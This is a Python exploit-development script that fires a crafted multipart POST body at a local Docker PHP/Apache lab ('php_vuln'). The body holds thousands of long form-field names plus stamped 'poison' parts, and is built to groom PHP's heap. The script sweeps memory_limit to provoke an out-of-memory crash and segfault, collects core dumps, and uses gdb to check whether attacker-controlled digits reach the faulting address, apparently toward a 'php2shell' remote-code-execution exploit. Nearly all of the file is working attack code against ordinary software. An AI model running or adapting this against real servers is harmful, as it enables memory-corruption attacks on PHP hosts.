#!/usr/bin/env python3
"""oom64: memory_limit sweep on pure stock.

oom63 finding: stock never OOMs at lim=20600000 — instrument build's
allocation overhead pushed IT over, stock stays under. The dial is the
limit itself.

Sweep lim: 14M, 13.5M, 13M, 12.5M, 12M, 11M, 10M (body ~13.5MB logical).
Geometry fixed at tuned values: P=40 pages poison (nl=163809... namelen
computed), k1=2044, prep=3. Per variant: rewrite ini, restart, fire once,
count oom+/segv+/cores. On first segv: determinism x3 + core decode.
"""
import re
import subprocess
import time
import urllib.request

LAB = "http://127.0.0.1:8081"
LIB = "/usr/lib/apache2/modules/libphp.so"
STOCK_MD5 = "ce1f3c48ba22f8f17834ac791aead613"
PHPLAB = "/Users/vlad/Projects/queue/php2shell-lab"
HEXD = b"0123456789abcdef"
KEYLEN = 3064
K1 = 2044
PREP = 3
POISON_PAGES = 40
CELLS = 10237


def sh(cmd, timeout=25, retries=2):
    for _ in range(retries + 1):
        try:
            r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", cmd],
                               capture_output=True, timeout=timeout)
            return (r.stdout.decode("latin1") + r.stderr.decode("latin1")[:150]).strip()
        except subprocess.TimeoutExpired:
            time.sleep(1)
    return "<<EXEC TIMEOUT>>"


def dcp(src, dst):
    return subprocess.run(["docker", "cp", src, dst], capture_output=True).returncode


def key_part(i):
    head = (b'--BOUND\r\nContent-Disposition: form-data; name="p' + b"K" * (KEYLEN - 8) +
            (b"%d" % i) + b'[x]"\r\n\r\n')
    return head + b"v\r\n"


def poison_part(n, stamp_offset):
    namelen = POISON_PAGES * 4096 - 25
    total = namelen - 1 - 6
    ncells = total // 16
    pad = total - ncells * 16
    idx = stamp_offset
    body = bytearray()
    for _ in range(ncells):
        stamp = bytes([HEXD[(idx >> (4 * (5 - k))) & 0xF] for k in range(6)])
        body += stamp + b"z" * 10
        idx += 1
    body += b"p" * pad
    nm = b"q" + bytes(body) + (b"%06d" % n)
    assert len(nm) == namelen
    return b'--BOUND\r\nContent-Disposition: form-data; name="' + nm + b'"\r\n\r\nv\r\n'


def build_attack(stamp_base):
    ps = [key_part(i) for i in range(K1)]
    ps += [poison_part(n, stamp_base + n * CELLS) for n in range(PREP)]
    ps += [key_part(i) for i in range(K1, 4200)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)


def http(path, body=None, ctype=None, timeout=40):
    req = urllib.request.Request(LAB + path, data=body)
    if ctype:
        req.add_header("Content-Type", ctype)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return "HTTP%s" % e.code
    except Exception as e:
        return type(e).__name__


def full_logs():
    r = subprocess.run(["docker", "logs", "php_vuln"], capture_output=True, timeout=120)
    return (r.stdout + r.stderr).decode("latin1", "replace")


def counts(logs):
    return (len(re.findall(r"exit signal Segmentation", logs)),
            len(re.findall(r"Allowed memory size of", logs)))


def set_lim(lim):
    ini = "memory_limit=%s\nmax_input_vars=100000\npost_max_size=4096M\n" % lim
    subprocess.run(["docker", "exec", "-i", "php_vuln", "sh", "-c",
                    "cat > /usr/local/etc/php/conf.d/30-oomlab.ini"],
                   input=ini.encode(), capture_output=True)
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    probe = "?"
    for _ in range(25):
        time.sleep(1.5)
        probe = sh("curl -s -m 5 http://127.0.0.1/oom_sapi.php", 10, 1)
        if "lim=" in probe:
            break
    return probe


def main():
    print("=== [0] stock verify ===", flush=True)
    md5 = sh("md5sum %s | cut -d' ' -f1" % LIB, 15)
    print("[md5]", md5, flush=True)
    if md5 != STOCK_MD5:
        print("[ABORT]", flush=True)
        return
    sh("grep -q 'ulimit -c' /etc/apache2/envvars || echo 'ulimit -c unlimited' >> /etc/apache2/envvars")
    sh("printf 'CoreDumpDirectory /tmp\\n' > /etc/apache2/conf-enabled/oomcore.conf")
    sh("rm -f /tmp/core*")

    att = build_attack(3000000)
    print("[attack]", len(att), "bytes", flush=True)

    lims = ["14M", "13M", "12500000", "12M", "11M", "10M", "9M", "8M"]
    hit = None
    for i, lim in enumerate(lims):
        print("=== variant lim=%s ===" % lim, flush=True)
        probe = set_lim(lim)
        ok = ("lim=%s" % lim) in probe or ("lim=%d" % int(lim.rstrip("M")) * 1000000 if lim.endswith("M") else False)
        print("[ini]", probe, flush=True)
        s0, o0 = counts(full_logs())
        code = http("/oom_mod.php", att, "multipart/form-data; boundary=BOUND")
        time.sleep(2)
        s1, o1 = counts(full_logs())
        cores = sh("ls /tmp/core* 2>/dev/null | wc -l", 10)
        print("  lim=%s: %s segv+=%d oom+=%d cores=%s" % (lim, code, s1 - s0, o1 - o0, cores), flush=True)
        if s1 > s0 and cores != "0":
            hit = lim
            break

    print("=== [2] hit=%s ===" % hit, flush=True)
    if hit:
        print("=== determinism x3 more at lim=%s ===" % hit, flush=True)
        for i in range(3):
            s0, o0 = counts(full_logs())
            code = http("/oom_mod.php", att, "multipart/form-data; boundary=BOUND")
            time.sleep(2)
            s1, o1 = counts(full_logs())
            print("  rep%d: %s segv+=%d oom+=%d cores=%s"
                  % (i, code, s1 - s0, o1 - o0, sh("ls /tmp/core* 2>/dev/null | wc -l", 10)), flush=True)
        corep = sh("ls -t /tmp/core* | head -1", 10)
        if corep.startswith("/tmp/core"):
            dcp("php_vuln:%s" % corep, PHPLAB + "/child.core.64")
            dcp(PHPLAB + "/libphp.so.stock", "phpbuild:/tmp/libphp.stock.so")
            dcp(PHPLAB + "/child.core.64", "phpbuild:/tmp/child.core.64")
            open("/tmp/g64.gdb", "w").write(
                "set pagination off\nbt 8\ninfo registers rip rdi rsi rax\n"
                "p $_siginfo._sifields._sigfault.si_addr\nx/2i $pc\n")
            r = subprocess.run(["docker", "exec", "phpbuild", "sh", "-c",
                                "gdb -q -batch -x /tmp/g64.gdb /tmp/libphp.stock.so /tmp/child.core.64 2>&1 | tail -30"],
                               capture_output=True, timeout=180)
            out = r.stdout.decode("latin1", "replace")
            print(out, flush=True)
            m = re.search(r'si_addr.*?=\s*(0x[0-9a-f]+)', out)
            if m:
                raw = int(m.group(1), 16).to_bytes(8, "little")
                digits = re.findall(rb"[0-9a-f]{6}", raw)
                print("[si_addr]", raw, "digits:", digits, flush=True)

    print("=== [3] restore ===", flush=True)
    sh("rm -f /usr/local/etc/php/conf.d/30-oomlab.ini /etc/apache2/conf-enabled/oomcore.conf /tmp/core*")
    sh("sed -i '/ulimit -c/d' /etc/apache2/envvars")
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    for _ in range(15):
        time.sleep(1.5)
        http("/oom_sapi.php", timeout=5)
    print("[restored]", sh("md5sum %s | cut -c1-8" % LIB, 15),
          sh("curl -s -m 5 http://127.0.0.1/oom_sapi.php", 10, 1), flush=True)
    print("=== DONE hit=%s ===" % hit, flush=True)


if __name__ == "__main__":
    main()
